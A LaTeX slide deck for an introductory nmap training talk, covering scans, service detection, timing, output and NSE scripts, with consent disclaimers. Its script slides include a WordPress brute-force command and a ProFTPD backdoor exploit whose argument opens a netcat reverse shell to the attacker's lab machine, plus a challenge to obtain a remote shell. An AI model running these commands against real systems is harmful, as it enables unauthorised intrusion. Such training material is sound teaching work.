@@ -1,0 +1,605 @@
+\documentclass[aspectratio=169,xcolor=dvipsnames]{beamer}
+\usepackage{listings}
+\usepackage{multirow}
+\usepackage{hyperref}
+
+\usetheme{SimplePlus}
+
+\definecolor{slightblue}{RGB}{0, 104, 173}
+
+\definecolor{mygray}{RGB}{200, 200, 200}
+\definecolor{mygreen}{RGB}{0, 186, 11}
+\definecolor{myyellow}{RGB}{179, 176, 16}
+\definecolor{myblack}{RGB}{30, 33, 35}
+
+\lstset{ 
+    backgroundcolor=\color{myblack},
+    language=bash,
+    basicstyle=\ttfamily\color{mygray},
+    morekeywords={*,sudo, nmap, root@kali},
+    keywordstyle=\color{mygreen},
+    stringstyle=\color{myyellow},
+    showstringspaces=false,
+    breaklines=true,
+    mathescape=true,
+}
+
+\AtBeginSection[]{
+  \begin{frame}
+  \vfill
+  \centering
+  \begin{beamercolorbox}[sep=8pt,center,shadow=true,rounded=true]{title}
+    \usebeamerfont{title}\insertsectionhead\par%
+  \end{beamercolorbox}
+  \vfill
+  \end{frame}
+}
+
+\title{\texttt{nmap} 101}
+\author{Santiago Gimenez Ocano}
+\date{}
+
+\begin{document}
+
+\begin{frame}
+    \titlepage
+\end{frame}
+
+\begin{frame}
+    \begin{itemize}
+        \item Lead Security Engineer at Praetorian
+        \item UtahSAINT member since 2019
+        \item DC435 "member" since 2019
+        \item Argentina
+    \end{itemize}
+\end{frame}
+
+\begin{frame}
+    \frametitle{Disclaimer}
+    
+    \begin{alertblock}{Warning}
+        \begin{center}
+            This document is only for education purposes. Before scanning a network, always ask for consent.
+        \end{center}
+    \end{alertblock}
+
+\end{frame}
+
+\begin{frame}
+    \frametitle{Agenda}
+    \tableofcontents
+\end{frame}
+
+\section{Introduction and Basic Usage}
+
+\subsection{Introduction}
+
+\begin{frame}
+    \frametitle{Introduction}
+
+    \begin{columns}
+        \begin{column}{0.5\textwidth}
+
+            \texttt{nmap} (``Network Mapper'') is a free an open-source utility for network discovery and security auditing.
+
+        \end{column}
+
+        \pause
+
+        \begin{column}{0.5\textwidth}
+    
+            \texttt{nmap} can determine:
+
+            \begin{itemize}
+                \item what hosts are available on the network,
+                \item what services those hosts are offering,
+                \item what operating systems they are running,
+                \item what type of pachet filters/firewalls are in use.
+            \end{itemize}
+
+        \end{column}
+    \end{columns}
+
+\end{frame}
+
+\begin{frame}
+    \frametitle{Introduction}
+
+    \begin{exampleblock}{Key Takeaway}
+        \begin{center}
+            \texttt{nmap} is a network scanner.
+        \end{center}
+    \end{exampleblock}
+
+    \pause
+
+    \begin{exampleblock}{Key Takeaway}
+        \begin{center}
+            \texttt{nmap} allows us to know how the network really is as opposed to how it should be.
+        \end{center}
+    \end{exampleblock}
+
+\end{frame}
+
+\subsection{Basic Usage}
+\begin{frame}[fragile]
+
+    \frametitle{Basic Usage}
+
+    \begin{exampleblock}{Key Takeaway}
+        \begin{center}
+            Methodology: From a broad perspective to the details.
+        \end{center}
+    \end{exampleblock}
+
+    \pause
+
+    \begin{center}
+        \begin{tabular}{rc}
+            \Huge$\uparrow$ & 
+            \begin{tabular}{cc}
+                \textbf{\texttt{nmap} phases} & \textbf{TCP/IP Model}\\ \hline
+                Script scanning & Application \\ \hline
+                Port scanning & Transport \\ \hline
+                \multirow{2}{*}{System discovery} & Internet\\ \cline{2-2}
+                & Link \\ \hline
+            \end{tabular}
+        \end{tabular}
+    \end{center}
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Basic Usage}
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap [Scan Type] [Options] {targets}
+    \end{lstlisting}
+
+    \texttt{Targets}:
+
+    \begin{itemize}
+        \item URLs,
+        \item list of IP addresses,
+        \item network addresses in CDIR,
+        \item mix of previous,
+        \item from a file.
+    \end{itemize}
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Basic Usage}
+    \begin{lstlisting}
+ root@kali $\#$ nmap 192.168.56.16
+    \end{lstlisting}
+
+    This will ping the host, then scan the top-1000 most used TCP ports.
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap 192.168.56.0/24
+    \end{lstlisting}
+
+    This will ping and then scan for the top-1000 most used TCP ports, but for the entire subnetwork.
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap 192.168.56.16-19
+    \end{lstlisting}
+
+    This is the same as to the previous example, but we use a list of IP addresses.
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -iL targets.txt
+    \end{lstlisting}
+
+    This will ping and then scan the top-1000 most used TCP ports, based on the hosts in the list.
+
+\end{frame}
+
+\section{Options}
+
+\subsection{Modifying The Standard Scan Command}
+
+\begin{frame}
+    \frametitle{Modifying The Standard Scan Command}
+
+    There are different types of options, the ones related to ports allow us to:
+
+    \begin{itemize}
+        \item change the number of top ports to scan,
+        \item specify ports to be scanned,
+        \item show only open ports,
+        \item scan UDP ports.
+    \end{itemize}
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Modifying The Standard Scan Command}
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap --top-ports 10 192.168.56.16
+    \end{lstlisting}
+
+    Scan only the top-10 most common ports.
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -F 192.168.56.16
+    \end{lstlisting}
+
+    Scan the top-100 ports. This is called a fast scan.
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -p- 192.168.56.16
+    \end{lstlisting}
+
+    scan all ports in the target.
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Modifying The Standard Scan Command}
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -p22,80,443 192.168.56.17
+    \end{lstlisting}
+
+    Scan only specific ports.
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap --open -p22,80,443 192.168.56.17
+    \end{lstlisting}
+
+    Same to the previous one, but show only the open ports. It will not show filtered ports.
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -sU --top-ports 10 192.168.56.16
+    \end{lstlisting}
+
+    Scan the top-10 most used UDP ports.
+
+\end{frame}
+
+\subsection{Getting More Information from \texttt{nmap}}
+
+\begin{frame}
+    \frametitle{Getting More Information from \texttt{nmap}}
+
+    The additional information we can get from \texttt{nmap} includes:
+
+    \begin{itemize}
+        \item OS fingerprinting,
+        \item service name and version,
+        \item vulnerabilities.
+    \end{itemize}
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Getting More Information from \texttt{nmap}}
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -O 192.168.56.16
+    \end{lstlisting}
+
+    OS fingerprinting.
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -sV 192.168.56.16
+    \end{lstlisting}
+
+    Service name and version detection.
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -sC 192.168.56.16
+    \end{lstlisting}
+
+    Additional information from services.
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -A 192.168.56.16
+    \end{lstlisting}
+
+    All the previous examples, plus a \texttt{traceroute}
+
+\end{frame}
+
+\section{Timing and Output}
+
+\subsection{Controlling The Scan's Speed}
+
+\begin{frame}[fragile]
+    \frametitle{Timing}
+
+    \texttt{nmap} automatically controls the speed of the scan based on network congestion.
+
+    \pause
+
+    \vspace{1em}
+  
+    However, we can overwrite this with:
+
+    \begin{itemize}
+        \item \texttt{-T0} (paranoid), 
+        \item \texttt{-T1} (sneaky), 
+        \item \texttt{-T2} (polite),
+        \item \texttt{-T3} (normal),
+        \item \texttt{-T4} (aggressive),
+        \item \texttt{-T5} (insane)
+    \end{itemize}
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -T5 192.168.56.16
+    \end{lstlisting}
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -T0 192.168.56.16
+    \end{lstlisting}
+
+\end{frame}
+
+\subsection{Saving the Output}
+
+\begin{frame}[fragile]
+    \frametitle{Saving the Output}
+
+    Output format options:
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap [frmt {<file_name>}] {targets}
+    \end{lstlisting}
+
+    \pause
+
+    Where \texttt{frmt}:
+
+    \begin{itemize}
+        \item \texttt{-oN} is for regular files,
+        \item \texttt{-oX} is for XML files,
+        \item \texttt{-oG} is for greppable files.
+    \end{itemize}
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -oG results.txt 192.168.56.16
+    \end{lstlisting}
+    
+\end{frame}
+
+\section{Scripts}
+
+\begin{frame}[fragile]
+    \frametitle{Scripts}
+
+    Scripts:
+
+    \begin{itemize}
+        \item extend the behavior of \texttt{nmap},
+        \item are run after open ports have been discovered,
+        \item allows us to:
+        \begin{itemize}
+            \item Get additional information (-C),
+            \item find categories of vulnerabilities,
+            \item find specific vulnerabilities.
+        \end{itemize}
+    \end{itemize}
+
+    \pause
+
+    \begin{alertblock}{Warning}
+        \begin{center}
+            Some of these scripts are considered intrusive.
+        \end{center}
+    \end{alertblock}
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Scripts}
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap [--script=<script> [--script-args=<script_arguments>]] {targets}
+    \end{lstlisting}
+
+\end{frame}
+
+
+\begin{frame}[fragile]
+    \frametitle{Scripts}
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap --script=vuln 192.168.56.16
+    \end{lstlisting}
+
+    Run all the scripts in the category vulnerability against the target.
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap --script="http-robots*" 192.168.56.16
+    \end{lstlisting}
+
+    Show the content of the \texttt{robots.txt} file.
+
+    \pause
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -sV --script="http-wordpress-brute*" --script-args="passdb=./dict.txt" 192.168.56.16
+    \end{lstlisting}
+       
+    Ataque de fuerza bruta en un servicio de Wordpress.
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Scripts}
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -sV --script="ftp-proftpd-backd*" 192.168.56.19
+    \end{lstlisting}
+
+    Check if the target is vulnerable to a specific vulnerability.
+
+    \pause       
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -sV --script="ftp-proftpd-back*" --script-args="cmd=ls" 192.168.56.19
+    \end{lstlisting}
+
+    List the content of a directory. We do this by modifying the arguments of the script.
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Scripts}
+
+    \begin{lstlisting}
+ root@kali $\#$ nmap -sV --script="ftp-proftpd-back*" --script-args="cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc 192.168.56.1 4444 >/tmp/f" 192.168.56.19
+    \end{lstlisting}
+
+    Create a remote connection back to the attacker's machine.
+
+    \begin{block}{Heads-up}
+        \begin{center}
+            You will need to have a \texttt{netcat} listener at port 4444 in your host machine. In Kali linux, you can use \texttt{nc -lvnp 4444} in a different terminal.
+        \end{center}
+    \end{block}  
+\end{frame}
+
+\section{Recap}
+
+\begin{frame}[fragile]
+    \frametitle{Warning}
+
+    \begin{alertblock}{Warning}
+        \begin{center}
+            Before scanning a network, always ask for consent.
+        \end{center}
+    \end{alertblock}  
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Takeways}
+
+    \begin{exampleblock}{Key Takeaway}
+        \begin{center}
+            \texttt{nmap} is a network scanner.
+        \end{center}
+    \end{exampleblock}
+
+    \pause
+
+    \begin{exampleblock}{Key Takeaway}
+        \begin{center}
+            \texttt{nmap} allows us to know how the network really is as opposed to how it should be.
+        \end{center}
+    \end{exampleblock}
+
+    \pause
+
+    \begin{exampleblock}{Key Takeaway}
+        \begin{center}
+            Methodology: From a broad perspective to the details.
+        \end{center}
+    \end{exampleblock}
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{What We Covered Today}
+    
+    We covered how to:
+
+    \begin{itemize}
+        \item Find systems in a network,
+        \item Find open ports in those systems,
+        \item Get the name and verion of services,
+        \item Execute scripts to get more info,
+        \item Execute scripts to find vulnerabilities,
+        \item Execure scripts to exploit vulnerabilities.
+    \end{itemize}
+
+    \pause
+
+    \begin{alertblock}{Warning}
+        \begin{center}
+            Some scripts are considered intrusive.
+        \end{center}
+    \end{alertblock}
+
+    \pause
+
+    \begin{exampleblock}{}
+        \begin{center}
+            This is only the tip of the iceberg!
+        \end{center}
+    \end{exampleblock}
+
+\end{frame}
+
+\begin{frame}
+
+    \centering
+    \Huge\textbf{\structure{Q \& A}}
+
+\end{frame}
+
+\begin{frame}
+   \frametitle{References}
+   
+    \begin{thebibliography}{9}        
+        \bibitem{site}
+            \texttt{https://nmap.org}
+        \bibitem{man}
+            \texttt{\# man nmap}
+        \bibitem{scripts}
+            \texttt{https://nmap.org/nsedoc/index.html}
+        \bibitem{book1}
+            \texttt{https://nmap.org/book}
+        \bibitem{book2}
+            Marsh, Nicholas. \textit{Nmap 6 Cookbook: The Fat-Free Guide to Network Scanning}.2015
+        \bibitem{templatte}
+            Slide Templates: SimplePlus-BeamerTheme. \texttt{https://github.com/PM25/SimplePlus-BeamerTheme}
+    \end{thebibliography}
+
+\end{frame}
+
+\begin{frame}
+    \frametitle{Challenge}
+
+    \begin{enumerate}
+        \item Identify the hidden port in 192.168.56.19.
+        \item Identify the name of the service and version in the hidden port.
+        \item Identify if the service is vulnerable to an exploit.
+        \item Obtain a remote shell by changing the script arguments.
+    \end{enumerate}
+
+\end{frame}
+
+\end{document}
